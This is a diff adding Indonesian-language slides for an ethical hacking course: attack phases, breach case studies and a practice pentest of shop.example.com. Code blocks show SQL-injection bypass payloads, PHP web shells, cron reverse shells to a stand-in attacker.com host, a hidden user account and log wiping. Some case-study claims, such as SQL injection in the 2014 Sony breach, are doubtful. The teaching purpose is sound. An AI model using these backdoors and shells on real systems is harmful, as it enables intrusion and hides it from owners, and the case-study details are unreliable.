+                            <li><strong>Holistic Approach:</strong> Test semua area yang relevan, bukan hanya satu aspek</li>
+                            <li><strong>Regular Testing:</strong> Lakukan testing secara berkala, bukan hanya sekali</li>
+                            <li><strong>Combined Testing:</strong> Kombinasikan automated dan manual testing</li>
+                            <li><strong>Real-world Scenarios:</strong> Test dengan skenario serangan yang realistis</li>
+                            <li><strong>Continuous Improvement:</strong> Update testing methodology berdasarkan threat landscape terbaru</li>
+                        </ul>
+                    </div>
+                    <div class="info" style="margin-top: 20px;">
+                        <strong>Catatan:</strong> Serangan modern sering menggunakan kombinasi beberapa area (contoh: social engineering + network attack + web app exploit)
+                    </div>
+                </section>
+            </section>
+
+            <!-- 1.3 Methodological of Ethical Hacking -->
+            <section>
+                <section>
+                    <h2>1.2 Methodological of Ethical Hacking</h2>
+                    <p>Metodologi yang sistematis untuk menguji keamanan sistem</p>
+                </section>
+
+                <section>
+                    <h3>Fase-fase Ethical Hacking</h3>
+                    <ol>
+                        <li><strong>Reconnaissance</strong> - Pengintaian</li>
+                        <li><strong>Scanning</strong> - Identifikasi sistem</li>
+                        <li><strong>Gaining Access</strong> - Eksploitasi kerentanan</li>
+                        <li><strong>Maintaining Access</strong> - Mempertahankan akses</li>
+                        <li><strong>Covering Tracks</strong> - Menyembunyikan aktivitas</li>
+                        <li><strong>Reporting</strong> - Dokumentasi temuan</li>
+                    </ol>
+                </section>
+
+                <!-- Fase 1: Reconnaissance -->
+                <section>
+                    <h3>Fase 1: Reconnaissance (Pengintaian)</h3>
+                    <p><strong>Penjelasan:</strong> Fase pengumpulan informasi tentang target tanpa melakukan kontak langsung. Dibagi menjadi dua jenis:</p>
+                    <div class="two-column">
+                        <div>
+                            <h4>Passive Reconnaissance</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Mengumpulkan info tanpa kontak langsung</li>
+                                <li>Tidak meninggalkan jejak</li>
+                                <li>Menggunakan sumber publik</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Active Reconnaissance</h4>
+                            <ul style="font-size: 0.85em;">
+                                <li>Interaksi langsung dengan target</li>
+                                <li>Bisa terdeteksi</li>
+                                <li>Lebih informatif</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Google dorking, WHOIS, DNS lookup, Shodan, Maltego, theHarvester, OSINT Framework
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 1: Reconnaissance - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Target Corporation Breach (2013)</h4>
+                            <p style="font-size: 0.75em;"><strong>Langkah Reconnaissance:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Attacker menemukan vendor HVAC (Fazio Mechanical) yang memiliki akses ke network Target</li>
+                                <li>Menggunakan Google dorking untuk mencari informasi tentang vendor</li>
+                                <li>Menemukan email phishing target di vendor</li>
+                                <li>Mengumpulkan informasi tentang network architecture melalui public documents</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Hasil Reconnaissance:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Identifikasi entry point (vendor credentials)</li>
+                                <li>Network topology information</li>
+                                <li>System architecture details</li>
+                                <li>Security controls yang digunakan</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Dampak:</strong> 40 juta kartu kredit dicuri, 70 juta customer records ter-expose
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Fase 2: Scanning -->
+                <section>
+                    <h3>Fase 2: Scanning (Identifikasi Sistem)</h3>
+                    <p><strong>Penjelasan:</strong> Mengidentifikasi sistem target secara aktif untuk menemukan informasi teknis seperti:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Port Scanning:</strong> Mengidentifikasi port yang terbuka</li>
+                        <li><strong>Service Detection:</strong> Menentukan service yang berjalan</li>
+                        <li><strong>OS Fingerprinting:</strong> Mengidentifikasi sistem operasi</li>
+                        <li><strong>Vulnerability Scanning:</strong> Mencari known vulnerabilities</li>
+                        <li><strong>Network Mapping:</strong> Membuat peta network topology</li>
+                    </ul>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Nmap, Nessus, OpenVAS, Masscan, Nikto, Burp Suite, OWASP ZAP
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 2: Scanning - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Equifax Breach (2017)</h4>
+                            <p style="font-size: 0.75em;"><strong>Langkah Scanning:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Port scanning mengidentifikasi Apache Struts framework</li>
+                                <li>Service detection menemukan versi Struts 2.3.x</li>
+                                <li>Vulnerability scanning mengidentifikasi CVE-2017-5638</li>
+                                <li>Network mapping menemukan akses ke database internal</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Hasil Scanning:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Apache Struts 2.3.x dengan vulnerability known</li>
+                                <li>Port 443 (HTTPS) terbuka</li>
+                                <li>Database port (3306) accessible dari web server</li>
+                                <li>No WAF (Web Application Firewall) detected</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Dampak:</strong> 147 juta records dicuri termasuk SSN, kartu kredit, data pribadi
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Fase 3: Gaining Access -->
+                <section>
+                    <h3>Fase 3: Gaining Access (Eksploitasi Kerentanan)</h3>
+                    <p><strong>Penjelasan:</strong> Fase dimana attacker mengeksploitasi vulnerability yang ditemukan untuk mendapatkan akses ke sistem:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Exploitation:</strong> Menggunakan exploit untuk vulnerability</li>
+                        <li><strong>Privilege Escalation:</strong> Meningkatkan level akses</li>
+                        <li><strong>Initial Access:</strong> Mendapatkan foothold di sistem</li>
+                        <li><strong>Code Execution:</strong> Mengeksekusi kode berbahaya</li>
+                    </ul>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Metasploit, Burp Suite, SQLMap, Exploit-DB, Custom exploits, Social Engineering Toolkit
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 3: Gaining Access - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Sony Pictures Hack (2014)</h4>
+                            <p style="font-size: 0.75em;"><strong>Langkah Gaining Access:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Menggunakan SQL injection pada login form</li>
+                                <li>Bypass authentication dengan SQL payload</li>
+                                <li>Upload web shell melalui file upload vulnerability</li>
+                                <li>Mendapatkan remote code execution</li>
+                                <li>Privilege escalation ke administrator</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Hasil Gaining Access:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Full access ke web server</li>
+                                <li>Database credentials compromised</li>
+                                <li>Access ke internal network</li>
+                                <li>Administrator privileges</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Dampak:</strong> 100TB data dicuri, email internal leaked, film unreleased di-publish
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 3: Gaining Access - Contoh Teknik</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// SQL Injection untuk bypass login</span>
+Username: admin<span class="string">' OR '1'='1</span>
+Password: anything
+
+<span class="comment">// Upload web shell</span>
+&lt;?php <span class="function">system</span>($_GET[<span class="string">'cmd'</span>]); ?&gt;
+
+<span class="comment">// Remote Code Execution via Apache Struts</span>
+POST /struts2-showcase/fileupload/upload.action
+Content-Type: multipart/form-data
+<span class="comment">// Exploit CVE-2017-5638</span></code></pre>
+                    </div>
+                </section>
+
+                <!-- Fase 4: Maintaining Access -->
+                <section>
+                    <h3>Fase 4: Maintaining Access (Mempertahankan Akses)</h3>
+                    <p><strong>Penjelasan:</strong> Setelah mendapatkan akses, attacker perlu mempertahankan akses untuk tujuan jangka panjang:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Backdoors:</strong> Membuat akses tersembunyi</li>
+                        <li><strong>Rootkits:</strong> Menyembunyikan aktivitas malicious</li>
+                        <li><strong>Trojans:</strong> Malware yang memberikan remote access</li>
+                        <li><strong>Persistence:</strong> Memastikan akses tetap ada setelah reboot</li>
+                        <li><strong>Lateral Movement:</strong> Bergerak ke sistem lain di network</li>
+                    </ul>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Netcat, Meterpreter, Cobalt Strike, Empire, PoshC2, Custom backdoors
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 4: Maintaining Access - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Marriott/Starwood Breach (2014-2018)</h4>
+                            <p style="font-size: 0.75em;"><strong>Langkah Maintaining Access:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Install backdoor pada compromised server</li>
+                                <li>Create persistent connection ke C&C server</li>
+                                <li>Install additional backdoors di multiple servers</li>
+                                <li>Lateral movement ke database servers</li>
+                                <li>Maintain access selama 4 tahun tanpa terdeteksi</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Teknik yang Digunakan:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Web shells di multiple locations</li>
+                                <li>SSH keys untuk persistent access</li>
+                                <li>Scheduled tasks untuk backdoor</li>
+                                <li>Encrypted C&C communication</li>
+                                <li>Anti-forensics techniques</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Dampak:</strong> 500 juta records dicuri, akses selama 4 tahun, $123 juta denda GDPR
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 4: Maintaining Access - Contoh Teknik</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Backdoor via cron job</span>
+* * * * * /usr/bin/nc attacker.com 4444 -e /bin/bash
+
+<span class="comment">// Web shell untuk persistent access</span>
+&lt;?php
+<span class="keyword">if</span> (<span class="function">isset</span>($_GET[<span class="string">'pass'</span>]) && $_GET[<span class="string">'pass'</span>] == <span class="string">'secret'</span>) {
+    <span class="function">eval</span>($_POST[<span class="string">'cmd'</span>]);
+}
+?&gt;
+
+<span class="comment">// SSH key untuk persistent access</span>
+<span class="function">echo</span> <span class="string">"ssh-rsa AAAAB3..."</span> &gt;&gt; ~/.ssh/authorized_keys</code></pre>
+                    </div>
+                </section>
+
+                <!-- Fase 5: Covering Tracks -->
+                <section>
+                    <h3>Fase 5: Covering Tracks (Menyembunyikan Aktivitas)</h3>
+                    <p><strong>Penjelasan:</strong> Menghapus atau menyembunyikan jejak aktivitas untuk menghindari deteksi:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Log Deletion:</strong> Menghapus log entries</li>
+                        <li><strong>Log Manipulation:</strong> Memodifikasi log untuk menyembunyikan aktivitas</li>
+                        <li><strong>Anti-Forensics:</strong> Menghapus file dan tools yang digunakan</li>
+                        <li><strong>Steganography:</strong> Menyembunyikan data dalam file lain</li>
+                        <li><strong>Encryption:</strong> Mengenkripsi komunikasi dan data</li>
+                    </ul>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Log cleaners, Timestomping tools, Anti-forensics tools, Steganography tools, Encryption tools
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 5: Covering Tracks - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Target Breach (2013)</h4>
+                            <p style="font-size: 0.75em;"><strong>Langkah Covering Tracks:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Menghapus log entries dari access logs</li>
+                                <li>Menggunakan timestomping untuk mengubah file timestamps</li>
+                                <li>Menghapus temporary files dan tools</li>
+                                <li>Mengenkripsi exfiltrated data</li>
+                                <li>Menggunakan encrypted channels untuk C&C</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Teknik yang Digunakan:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Log file manipulation</li>
+                                <li>File timestamp modification</li>
+                                <li>Process hiding</li>
+                                <li>Encrypted data exfiltration</li>
+                                <li>Anti-forensics tools</li>
+                            </ul>
+                            <div class="warning" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Catatan:</strong> Meskipun melakukan covering tracks, aktivitas masih terdeteksi setelah 2 minggu
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 5: Covering Tracks - Contoh Teknik</h3>
+                    <div class="code-block">
+<pre><code><span class="comment">// Menghapus log entries</span>
+<span class="function">sed</span> -i <span class="string">'/attacker_ip/d'</span> /var/log/apache2/access.log
+
+<span class="comment">// Timestomping (mengubah timestamp file)</span>
+<span class="function">touch</span> -t 202001010000 malicious_file.php
+
+<span class="comment">// Menghapus history</span>
+<span class="function">history</span> -c
+<span class="function">rm</span> ~/.bash_history
+
+<span class="comment">// Mengenkripsi data sebelum exfiltration</span>
+<span class="function">tar</span> czf - sensitive_data | <span class="function">openssl</span> enc -aes-256-cbc &gt; encrypted.tar.gz</code></pre>
+                    </div>
+                </section>
+
+                <!-- Fase 6: Reporting -->
+                <section>
+                    <h3>Fase 6: Reporting (Dokumentasi Temuan)</h3>
+                    <p><strong>Penjelasan:</strong> Dokumentasi lengkap tentang temuan keamanan untuk ethical hacker:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>Executive Summary:</strong> Ringkasan untuk manajemen</li>
+                        <li><strong>Technical Details:</strong> Detail teknis vulnerability</li>
+                        <li><strong>Proof of Concept:</strong> Contoh eksploitasi</li>
+                        <li><strong>Risk Assessment:</strong> Penilaian risiko</li>
+                        <li><strong>Remediation:</strong> Rekomendasi perbaikan</li>
+                    </ul>
+                    <div class="info" style="margin-top: 15px;">
+                        <strong>Tools:</strong> Dradis, Faraday, Serpico, Custom reporting templates, Documentation tools
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 6: Reporting - Studi Kasus</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Kasus: Penetration Test untuk E-commerce</h4>
+                            <p style="font-size: 0.75em;"><strong>Struktur Laporan:</strong></p>
+                            <ol style="font-size: 0.7em;">
+                                <li>Executive Summary dengan risk rating</li>
+                                <li>Technical findings dengan PoC</li>
+                                <li>Screenshots dan evidence</li>
+                                <li>Risk assessment (CVSS scores)</li>
+                                <li>Remediation steps yang jelas</li>
+                                <li>Timeline dan recommendations</li>
+                            </ol>
+                        </div>
+                        <div>
+                            <h4>Hasil Reporting:</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>15 critical vulnerabilities ditemukan</li>
+                                <li>SQL injection di checkout process</li>
+                                <li>Broken authentication</li>
+                                <li>Insecure direct object reference</li>
+                                <li>Security misconfiguration</li>
+                            </ul>
+                            <div class="success" style="margin-top: 10px; font-size: 0.7em;">
+                                <strong>Dampak:</strong> Semua vulnerability diperbaiki dalam 30 hari, meningkatkan security posture secara signifikan
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Fase 6: Reporting - Template Laporan</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># Penetration Test Report Template</span>
+
+<span class="comment">## 1. Executive Summary</span>
+- Overview of testing scope
+- Risk rating summary
+- Key findings
+
+<span class="comment">## 2. Methodology</span>
+- Testing approach
+- Tools used
+- Timeline
+
+<span class="comment">## 3. Findings</span>
+### Critical Findings
+- Vulnerability: SQL Injection
+- CVSS Score: 9.8 (Critical)
+- Description: ...
+- Proof of Concept: ...
+- Impact: ...
+- Remediation: ...
+
+<span class="comment">## 4. Risk Assessment</span>
+- Risk matrix
+- Business impact analysis
+
+<span class="comment">## 5. Recommendations</span>
+- Priority-based remediation
+- Long-term security improvements</code></pre>
+                    </div>
+                </section>
+
+                <!-- Summary Fase-fase -->
+                <section>
+                    <h3>Ringkasan Fase-fase Ethical Hacking</h3>
+                    <table style="font-size: 0.7em;">
+                        <thead>
+                            <tr>
+                                <th>Fase</th>
+                                <th>Tujuan</th>
+                                <th>Tools Utama</th>
+                                <th>Durasi</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Reconnaissance</strong></td>
+                                <td>Pengumpulan informasi</td>
+                                <td>Google, WHOIS, Shodan</td>
+                                <td>1-2 minggu</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Scanning</strong></td>
+                                <td>Identifikasi sistem & vulnerability</td>
+                                <td>Nmap, Nessus, Burp Suite</td>
+                                <td>3-5 hari</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Gaining Access</strong></td>
+                                <td>Eksploitasi vulnerability</td>
+                                <td>Metasploit, SQLMap</td>
+                                <td>1-3 hari</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Maintaining Access</strong></td>
+                                <td>Mempertahankan akses</td>
+                                <td>Backdoors, Rootkits</td>
+                                <td>Ongoing</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Covering Tracks</strong></td>
+                                <td>Menyembunyikan aktivitas</td>
+                                <td>Log cleaners, Encryption</td>
+                                <td>Ongoing</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Reporting</strong></td>
+                                <td>Dokumentasi temuan</td>
+                                <td>Dradis, Custom templates</td>
+                                <td>1-2 minggu</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <!-- Studi Kasus Praktis untuk Praktek -->
+                <section>
+                    <h2>Studi Kasus Praktis: Penetration Test Website E-Commerce</h2>
+                    <p>Berikut adalah studi kasus lengkap yang dapat digunakan sebagai bahan praktek untuk memahami setiap fase ethical hacking</p>
+                    <div class="info" style="margin-top: 20px;">
+                        <strong>Scenario:</strong> Anda adalah ethical hacker yang ditugaskan untuk melakukan penetration test pada website e-commerce sederhana: <strong>shop.example.com</strong>
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 1: Reconnaissance -->
+                <section>
+                    <h3>Praktek Fase 1: Reconnaissance</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Mengumpulkan informasi tentang target tanpa melakukan kontak langsung
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Google Dorking</strong> - Cari informasi publik tentang website</li>
+                        <li><strong>WHOIS Lookup</strong> - Cari informasi domain dan pemilik</li>
+                        <li><strong>DNS Lookup</strong> - Identifikasi subdomain dan DNS records</li>
+                        <li><strong>Social Media</strong> - Cari informasi di social media</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 1: Reconnaissance - Langkah Detail</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># 1. Google Dorking</span>
+<span class="comment"># Cari informasi tentang website</span>
+site:shop.example.com
+site:shop.example.com filetype:pdf
+site:shop.example.com "admin"
+site:shop.example.com "login"
+
+<span class="comment"># 2. WHOIS Lookup</span>
+<span class="comment"># Gunakan whois command atau website whois.net</span>
+whois shop.example.com
+
+<span class="comment"># Informasi yang didapat:</span>
+<span class="comment"># - Domain registrar</span>
+<span class="comment"># - Contact information</span>
+<span class="comment"># - DNS servers</span>
+<span class="comment"># - Registration date</span>
+
+<span class="comment"># 3. DNS Lookup</span>
+nslookup shop.example.com
+dig shop.example.com
+dig shop.example.com MX
+dig shop.example.com TXT
+
+<span class="comment"># 4. Subdomain Enumeration</span>
+<span class="comment"># Cari subdomain yang mungkin ada</span>
+<span class="comment"># www.shop.example.com</span>
+<span class="comment"># admin.shop.example.com</span>
+<span class="comment"># api.shop.example.com</span>
+<span class="comment"># test.shop.example.com</span></code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 1: Reconnaissance - Hasil yang Diharapkan</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Informasi yang Ditemukan:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Domain: shop.example.com</li>
+                                <li>IP Address: 192.168.1.100</li>
+                                <li>Subdomain: admin.shop.example.com</li>
+                                <li>Technology: PHP, MySQL</li>
+                                <li>Email: admin@example.com</li>
+                                <li>Social Media: @shopexample</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Dokumentasi:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Screenshot hasil Google dorking</li>
+                                <li>WHOIS information</li>
+                                <li>DNS records</li>
+                                <li>Subdomain list</li>
+                                <li>Technology stack identified</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="success" style="margin-top: 15px;">
+                        <strong>Catatan:</strong> Semua informasi ini dikumpulkan tanpa melakukan kontak langsung dengan server target (passive reconnaissance)
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 2: Scanning -->
+                <section>
+                    <h3>Praktek Fase 2: Scanning</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Mengidentifikasi sistem, port terbuka, dan vulnerability
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Port Scanning</strong> - Identifikasi port yang terbuka</li>
+                        <li><strong>Service Detection</strong> - Identifikasi service yang berjalan</li>
+                        <li><strong>OS Fingerprinting</strong> - Identifikasi sistem operasi</li>
+                        <li><strong>Vulnerability Scanning</strong> - Cari known vulnerabilities</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 2: Scanning - Langkah Detail</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># 1. Port Scanning dengan Nmap</span>
+<span class="comment"># Basic scan</span>
+nmap shop.example.com
+
+<span class="comment"># Scan semua port</span>
+nmap -p- shop.example.com
+
+<span class="comment"># Service version detection</span>
+nmap -sV shop.example.com
+
+<span class="comment"># OS detection</span>
+nmap -O shop.example.com
+
+<span class="comment"># Comprehensive scan</span>
+nmap -sS -sV -O -p- shop.example.com
+
+<span class="comment"># 2. Web Server Scanning</span>
+nikto -h shop.example.com
+
+<span class="comment"># 3. SSL/TLS Scanning</span>
+sslscan shop.example.com
+nmap --script ssl-enum-ciphers -p 443 shop.example.com
+
+<span class="comment"># 4. Vulnerability Scanning</span>
+nmap --script vuln shop.example.com</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 2: Scanning - Hasil yang Diharapkan</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Port yang Terbuka:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Port 22 (SSH) - OpenSSH 7.4</li>
+                                <li>Port 80 (HTTP) - Apache 2.4.29</li>
+                                <li>Port 443 (HTTPS) - Apache 2.4.29</li>
+                                <li>Port 3306 (MySQL) - MySQL 5.7</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Vulnerability Ditemukan:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Apache 2.4.29 - beberapa CVE</li>
+                                <li>MySQL 5.7 - potential SQL injection</li>
+                                <li>Weak SSL/TLS configuration</li>
+                                <li>Directory listing enabled</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="code-block" style="margin-top: 15px;">
+<pre><code><span class="comment"># Contoh output Nmap</span>
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.4
+80/tcp   open  http       Apache httpd 2.4.29
+443/tcp  open  ssl/http   Apache httpd 2.4.29
+3306/tcp open  mysql      MySQL 5.7.20</code></pre>
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 3: Gaining Access -->
+                <section>
+                    <h3>Praktek Fase 3: Gaining Access</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Mengeksploitasi vulnerability untuk mendapatkan akses ke sistem
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Web Application Testing</strong> - Test vulnerability di web app</li>
+                        <li><strong>SQL Injection</strong> - Test SQL injection vulnerability</li>
+                        <li><strong>Authentication Bypass</strong> - Test login mechanism</li>
+                        <li><strong>File Upload</strong> - Test file upload vulnerability</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 3: Gaining Access - Langkah Detail</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># 1. Test SQL Injection di Login Form</span>
+<span class="comment"># URL: shop.example.com/login.php</span>
+
+<span class="comment"># Payload untuk bypass login:</span>
+Username: admin<span class="string">' OR '1'='1</span>
+Password: anything
+
+<span class="comment"># Atau menggunakan SQLMap</span>
+sqlmap -u "http://shop.example.com/login.php" --forms --batch
+
+<span class="comment"># 2. Test Directory Traversal</span>
+http://shop.example.com/view.php?file=../../../etc/passwd
+
+<span class="comment"># 3. Test File Upload</span>
+<span class="comment"># Upload file PHP untuk web shell</span>
+&lt;?php <span class="function">system</span>($_GET[<span class="string">'cmd'</span>]); ?&gt;
+
+<span class="comment"># 4. Test XSS (Cross-Site Scripting)</span>
+&lt;script&gt;<span class="function">alert</span>(<span class="string">'XSS'</span>)&lt;/script&gt;
+
+<span class="comment"># 5. Burp Suite untuk intercept request</span>
+<span class="comment"># Gunakan Burp Suite untuk intercept dan modify HTTP requests</span></code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 3: Gaining Access - Contoh Eksploitasi</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>SQL Injection Success:</h4>
+                            <div class="code-block" style="font-size: 0.7em;">
+<pre><code><span class="comment"># Login berhasil dengan SQL injection</span>
+<span class="comment"># Sekarang punya akses sebagai admin</span>
+
+<span class="comment"># Dapat akses ke:</span>
+- Admin panel
+- User database
+- Product management
+- Order information</code></pre>
+                            </div>
+                        </div>
+                        <div>
+                            <h4>Web Shell Upload:</h4>
+                            <div class="code-block" style="font-size: 0.7em;">
+<pre><code><span class="comment"># Upload shell.php berhasil</span>
+<span class="comment"># Akses shell:</span>
+http://shop.example.com/uploads/shell.php?cmd=whoami
+
+<span class="comment"># Sekarang bisa execute commands:</span>
+?cmd=ls -la
+?cmd=cat /etc/passwd
+?cmd=id</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="warning" style="margin-top: 15px;">
+                        <strong>Penting:</strong> Dalam penetration test yang sebenarnya, selalu dapatkan izin tertulis sebelum melakukan eksploitasi!
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 4: Maintaining Access -->
+                <section>
+                    <h3>Praktek Fase 4: Maintaining Access</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Mempertahankan akses yang sudah didapat untuk testing jangka panjang
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Create Backdoor</strong> - Buat akses tersembunyi</li>
+                        <li><strong>Persistent Connection</strong> - Setup koneksi yang persisten</li>
+                        <li><strong>Privilege Escalation</strong> - Tingkatkan level akses</li>
+                        <li><strong>Lateral Movement</strong> - Eksplorasi sistem lain</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 4: Maintaining Access - Langkah Detail</h3>
+                    <div class="code-block">
+<pre><code><span class="comment"># 1. Create Backdoor via Cron Job</span>
+<span class="comment"># Setelah dapat shell access</span>
+
+<span class="comment"># Edit crontab</span>
+crontab -e
+
+<span class="comment"># Tambahkan backdoor (reverse shell setiap 5 menit)</span>
+*/5 * * * * /bin/bash -c <span class="string">'bash -i >& /dev/tcp/attacker.com/4444 0>&1'</span>
+
+<span class="comment"># 2. Create Web Shell di Multiple Locations</span>
+<span class="comment"># Upload shell ke beberapa lokasi:</span>
+- /var/www/html/uploads/shell.php
+- /var/www/html/images/shell.php
+- /var/www/html/tmp/shell.php
+
+<span class="comment"># 3. Create SSH Key untuk Persistent Access</span>
+<span class="comment"># Generate SSH key</span>
+ssh-keygen -t rsa
+
+<span class="comment"># Copy public key ke authorized_keys</span>
+<span class="function">echo</span> <span class="string">"ssh-rsa AAAAB3..."</span> &gt;&gt; ~/.ssh/authorized_keys
+
+<span class="comment"># 4. Create Hidden User Account</span>
+<span class="function">useradd</span> -m -s /bin/bash backupuser
+<span class="function">passwd</span> backupuser</code></pre>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Praktek Fase 4: Maintaining Access - Verifikasi</h3>
+                    <div class="two-column">
+                        <div>
+                            <h4>Backdoor yang Dibuat:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Cron job backdoor ✓</li>
+                                <li>Web shell di 3 lokasi ✓</li>
+                                <li>SSH key installed ✓</li>
+                                <li>Hidden user account ✓</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Testing Persistence:</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Test cron job backdoor</li>
+                                <li>Test web shell masih accessible</li>
+                                <li>Test SSH login dengan key</li>
+                                <li>Test hidden user login</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="code-block" style="margin-top: 15px;">
+<pre><code><span class="comment"># Test backdoor</span>
+<span class="comment"># Setup listener di attacker machine</span>
+nc -lvp 4444
+
+<span class="comment"># Tunggu cron job execute (max 5 menit)</span>
+<span class="comment"># Akan dapat reverse shell connection</span></code></pre>
+                    </div>
+                </section>
+
+                <!-- Praktek Fase 5: Covering Tracks -->
+                <section>
+                    <h3>Praktek Fase 5: Covering Tracks</h3>
+                    <div class="info">
+                        <strong>Tujuan:</strong> Menghapus atau menyembunyikan jejak aktivitas testing
+                    </div>
+                    <h4>Langkah-langkah Praktek:</h4>
+                    <ol style="font-size: 0.85em;">
+                        <li><strong>Clean Log Files</strong> - Hapus log entries</li>
+                        <li><strong>Modify Timestamps</strong> - Ubah timestamp file</li>
+                        <li><strong>Remove Tools</strong> - Hapus tools yang digunakan</li>
